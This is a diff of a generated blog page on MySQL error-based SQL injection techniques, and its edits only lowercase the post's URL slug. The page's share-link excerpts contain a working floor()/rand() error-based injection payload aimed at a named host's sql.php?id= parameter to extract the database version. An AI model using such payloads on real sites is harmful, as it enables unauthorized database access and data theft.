@@ -10,7 +10,7 @@
 <meta name="keywords" content="Mysql,sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mysql暴错注入方法整理">
-<meta property="og:url" content="http://yoursite.com/2016/05/18/MysqlBurstInjection/index.html">
+<meta property="og:url" content="http://yoursite.com/2016/05/18/mysqlburstinjection/index.html">
 <meta property="og:site_name" content="Windy&#39;s blog">
 <meta property="og:description" content="mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法 1、通过floor暴错 数据库版本 1http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (s">
 <meta property="og:updated_time" content="2017-01-18T04:47:04.000Z">
@@ -86,16 +86,16 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2016/05/18/MysqlBurstInjection/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&text=Mysql暴错注入方法整理"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&is_video=false&description=Mysql暴错注入方法整理"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Mysql暴错注入方法整理&body=Check out this article: http://yoursite.com/2016/05/18/MysqlBurstInjection/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2016/05/18/mysqlburstinjection/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&text=Mysql暴错注入方法整理"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&is_video=false&description=Mysql暴错注入方法整理"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Mysql暴错注入方法整理&body=Check out this article: http://yoursite.com/2016/05/18/mysqlburstinjection/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
 &lt;h2 id=&#34;1、通过floor暴错&#34;&gt;&lt;a href=&#34;#1、通过floor暴错&#34; class=&#34;headerlink&#34; title=&#34;1、通过floor暴错&#34;&gt;&lt;/a&gt;1、通过floor暴错&lt;/h2&gt;&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;数据库版本&lt;/p&gt;
 &lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -150,7 +150,7 @@
 
       
     <div class="article-tag">
-        <span id="/2016/05/18/MysqlBurstInjection/" class="leancloud_visitors" data-flag-title="Mysql暴错注入方法整理">                    
+        <span id="/2016/05/18/mysqlburstinjection/" class="leancloud_visitors" data-flag-title="Mysql暴错注入方法整理">                    
             <span class="post-meta-item-icon">
             <i class="fa fa-eye"></i>
             </span>
@@ -247,16 +247,16 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2016/05/18/MysqlBurstInjection/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&text=Mysql暴错注入方法整理"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&is_video=false&description=Mysql暴错注入方法整理"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Mysql暴错注入方法整理&body=Check out this article: http://yoursite.com/2016/05/18/MysqlBurstInjection/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/MysqlBurstInjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2016/05/18/mysqlburstinjection/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&text=Mysql暴错注入方法整理"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&is_video=false&description=Mysql暴错注入方法整理"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Mysql暴错注入方法整理&body=Check out this article: http://yoursite.com/2016/05/18/mysqlburstinjection/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&title=Mysql暴错注入方法整理"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2016/05/18/mysqlburstinjection/&name=Mysql暴错注入方法整理&description=&lt;p&gt;mysql暴错注入方法整理，通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法&lt;/p&gt;
 &lt;h2 id=&#34;1、通过floor暴错&#34;&gt;&lt;a href=&#34;#1、通过floor暴错&#34; class=&#34;headerlink&#34; title=&#34;1、通过floor暴错&#34;&gt;&lt;/a&gt;1、通过floor暴错&lt;/h2&gt;&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;数据库版本&lt;/p&gt;
 &lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://www.yangjiye.top/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
